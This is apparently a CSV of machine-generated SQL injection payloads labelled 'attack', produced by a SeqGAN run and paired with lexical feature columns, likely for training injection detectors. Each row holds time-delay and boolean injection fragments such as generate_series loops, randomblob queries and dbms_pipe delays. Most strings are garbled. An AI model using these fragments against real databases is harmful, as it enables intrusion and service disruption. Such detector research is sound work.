label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%%%%%nullf' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'9",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,10,129.0,36.0,4.060077822962219,42.0,22.0,45.0,20.0,0.32558139534883723,0.17054263565891473,0.3488372093023256,0.15503875968992248,2.0,0.0,0.0,0.0,1.0,2.0,0.0,7.0,5.0,1.0,1.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"select u%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46nulld4123c%$tblsuont  (hrjJq'  )   and make_set  (  4551  =  6487,6487  )   and   (  'p'  =  'qii%vm'momvvh%%'  =  '%(v'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '%%%26334297where'  )   and 3202  =  like  (  '301824646b'  =  '8407%%%%%$46'  =  '%%b9""   )    )     =     (    (   ""'  =  '%%%%%%%%46("" u8407  =    like u'||  (  select 'Z65 where "" %2633%'  =  '%%ou
.t'  =  '%%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%[%%m3018`Ro<t46fqubp%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'M'||||ch4641qH\p",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,11,943.0,59.0,4.2701978876174,261.0,154.0,345.0,183.0,0.2767762460233298,0.1633085896076352,0.36585365853658536,0.19406150583244963,32.0,6.0,0.0,1.0,3.0,19.0,0.0,53.0,42.0,5.0,6.0,33.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,5.0,0.0,4.0,3.0,10.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,"1%%%%5   [""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   """"   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""'+  (  select '+.83%%%%J5'  =  '%u%%U'  =  '%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%%%%%%%'  =  '%%'  )   and 3202  =  like  (  ''$tbM"".%%%%%z""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%%4728b' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""R46' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z&8635z    (hrqu' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  'q%%'  )   and 3202  =  like  (  ''  =  'Mqun(1%u8407%%%%%b46' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z9688'  =  '%%3018hM=q%%%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'P83null4uc%%%%pf%%%'  =  '%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'9%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%4297kt""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   '%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,12,1928.0,56.0,3.9860613569261742,538.0,259.0,793.0,338.0,0.279045643153527,0.13433609958506224,0.4113070539419087,0.17531120331950206,45.0,17.0,0.0,5.0,8.0,30.0,0.0,130.0,71.0,5.0,12.0,51.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,8.0,0.0,5.0,6.0,24.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,43.0
attack,"1%%u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""120%2367""  =  ""$46",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,13,146.0,39.0,4.078536376741332,38.0,30.0,53.0,25.0,0.2602739726027397,0.2054794520547945,0.363013698630137,0.17123287671232876,2.0,4.0,0.0,0.0,1.0,4.0,0.0,7.0,3.0,1.0,1.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"%%%%67%9643%%z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'_8635_46QY=""   )    )     =     (    (   ""ggM%%%'  =  '%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'@select8407%%$f%3902u'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '%%'  =  '%%%'  =  '%%andU(3902""h46'  =  '%%'  )   and 3202  =  like  (  '%f%3018from%%%%%4212'  =  '%%%%%%'  =  'whereG86355qi_g'  =  ''46""   3902%u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%%%%%%%%%""   )    )     =     (    (   ""zqrfv
%%%%'  )   and 3202  =  like  (  ''  )   and 3202  =  like  (  '9]%39027417' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '4212%k' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'ztb' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'120}8""%""4123'qjle'%h46quovmou""   )    )     =     (    (   ""_""f""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,14,1356.0,59.0,4.200715633515273,385.0,213.0,504.0,254.0,0.28392330383480824,0.1570796460176991,0.37168141592920356,0.1873156342182891,39.0,13.0,0.0,1.0,6.0,27.0,0.0,76.0,61.0,10.0,9.0,39.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,6.0,0.0,5.0,6.0,14.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,31.0
attack,"1%%%%46Hlb42974123ufu%%""   )    )     =     (    (   ""%'  =  '%%%%'  =  '%%%%%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,15,78.0,19.0,3.0352768982939544,6.0,11.0,32.0,29.0,0.07692307692307693,0.14102564102564102,0.41025641025641024,0.3717948717948718,4.0,2.0,0.0,0.0,0.0,3.0,0.0,4.0,16.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%%46uf'h""   )    )     =     (    (   ""120(v_9688%2367q$ ru%%%%30183902""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""{;'  )   and 3202  =  like  (  'Gu    (   ""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  '%%kR' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'	84641"" 4212u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%""  =  ""%%%%%%'  )   and 3202  =  like  (  '%%'  )   and 3202  =  like  (  '3018z5333v%%%%%Xchar'  )   and 3202  =  like  (  '""  =  ""qu%39023902'  =  '%'  =  '%b9688' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'VR'  =  '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""uj' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '~pw'  )   and 3202  =  like  (  'o_u%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +':N9643_Wfv%'  =  '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""{84072_u""  =  "".'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'$'qjle'='p    ""g%%%%'  =  '%%%'  =  '%@where30189643    (   ",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,16,2111.0,60.0,4.143174022984085,626.0,338.0,803.0,344.0,0.2965419232591189,0.16011369019422075,0.3803884414969209,0.16295594504973945,54.0,18.0,0.0,0.0,14.0,44.0,1.0,117.0,42.0,15.0,15.0,68.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,12.0,0.0,10.0,12.0,25.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,59.0
attack,"%%%B%%@!7417I2633'    (    (hrqrqrfv%qMq?fbV"" like ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'f4212'  =  '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'}500000000Mq4123fquh' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""5i' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  '8407'  )   and 3202  =  like  (  'u84072633hj;4212='  =  '%ouo.8407oBll4123 uc%%%%%120or%%30183902%%'  =  '%%%%%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%kzzgb' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""%""cand%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""load_file'  =  '%%$%%%%%'  =  '%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ''  )   and 3202  =  like  (  '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""\%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  """"  =  ""4297'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   ''   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%""  =  ""47284212ufj2633",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,17,2367.0,60.0,4.111890550328839,693.0,396.0,908.0,370.0,0.29277566539923955,0.16730038022813687,0.38360794254330377,0.1563160118293198,51.0,20.0,0.0,2.0,14.0,44.0,1.0,140.0,44.0,14.0,18.0,73.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,13.0,0.0,12.0,13.0,25.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,65.0
attack,"olup  (  110,46(* uqivwhere'ru%%%'  =  '46f%%%%%;9643""    =    (     select u    (   "" --u' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%%%%'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""%""         (      (    (    (   * 83 )    (   ""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""jz_83bm.7471h""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""7417o6565ipequ*uf%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '8407%%%62367%2367%%%%%3018Vnull%263399643/' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%@3018' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  """"  =  ""%i2367""  =  ""--""%""#f'  =  '%%%%%4674178407from%$%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,18,1416.0,55.0,4.189580193991749,430.0,217.0,536.0,233.0,0.3036723163841808,0.15324858757062146,0.3785310734463277,0.16454802259887005,22.0,20.0,4.0,3.0,11.0,20.0,1.0,84.0,38.0,5.0,11.0,42.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,7.0,0.0,4.0,6.0,16.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,33.0
attack,"1%%%%3018h46qand=(hnullh'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   '#[4641"" like ""|G8407' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'p' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,19,868.0,46.0,3.9804700164374363,273.0,147.0,334.0,114.0,0.31451612903225806,0.1693548387096774,0.3847926267281106,0.1313364055299539,14.0,2.0,0.0,0.0,6.0,14.0,0.0,53.0,4.0,6.0,6.0,27.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,7.0,0.0,6.0,6.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
attack,"select ruk%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'f%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'120(hkW/%/?('  =  '%%XV9643'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'iV)",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,20,709.0,43.0,3.981770246425831,210.0,119.0,274.0,106.0,0.29619181946403383,0.16784203102961917,0.38645980253878703,0.14950634696755993,14.0,0.0,0.0,2.0,5.0,12.0,0.0,46.0,10.0,5.0,6.0,24.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,6.0,0.0,5.0,5.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1%%%%%%46$--%$46' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'fv_'  =  '%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'?"" like ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""   )    )     =     (    (   """" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""_h )68%'  =  '%'  =  '46""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""__38514--b46 2633M%'$%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8635f%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'3595-y""  =  ""NF"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%f/|r{%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'w5!z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  """" like ""8312hp3902u'  =  '%%3018'  )   and make_set  (  4551  =  6487,6487  )   and   (  '?' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""N46    char4297tmbwhere('   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%42973018%'  =  '%%z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'D^6746zg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '7' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'m'46%M%%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'  =  '%}G%'  =  '%%%%%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,21,3076.0,61.0,4.123911313410374,903.0,496.0,1192.0,485.0,0.2935630689206762,0.16124837451235371,0.38751625487646296,0.15767230169050714,60.0,22.0,5.0,3.0,18.0,52.0,0.0,190.0,41.0,26.0,25.0,108.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,17.0,0.0,16.0,17.0,33.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,84.0
attack,"1%%%'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'Q2633* /u%%%%%%$%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""%""{' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'3902'||  (  select '' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '8635%%3018' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'`""%""orD4212%f%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '
char'  )   and make_set  (  4551  =  6487,6487  )   and   (  'j' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""8635mo  \fu'8407%'  )   and 3202  =  like  (  '$t7417%%%%'  =  '%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'39028407u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z%'  =  '%%%%%%2367%%%%'  =  '%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""8407%UsuJ2367%%%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  """"   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""MB66%%%%%%$and,f%"" like "":46h""Q2633ulike 8635""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ''+  (  select '3018G'+  (  select '8635c%`$tu'  ||rj",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,22,2694.0,62.0,4.191225235901667,828.0,434.0,1008.0,424.0,0.30734966592427615,0.16109873793615442,0.3741648106904232,0.15738678544914625,54.0,17.0,0.0,3.0,17.0,38.0,0.0,161.0,54.0,17.0,23.0,82.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,17.0,0.0,12.0,14.0,34.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,78.0
